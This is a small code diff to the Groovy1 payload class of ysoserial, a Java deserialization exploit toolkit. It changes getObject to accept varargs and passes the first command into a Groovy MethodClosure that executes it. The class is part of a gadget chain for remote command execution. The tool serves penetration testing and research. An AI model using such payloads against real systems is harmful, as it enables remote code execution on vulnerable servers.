@@ -31,8 +31,8 @@ import ysoserial.payloads.util.PayloadRunner;
 @Authors({ Authors.FROHOFF })
 public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
 
-	public InvocationHandler getObject(final String command) throws Exception {
-		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
+	public InvocationHandler getObject(final String ... command) throws Exception {
+		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command[0], "execute"), "entrySet");
 
 		final Map map = Gadgets.createProxy(closure, Map.class);
 
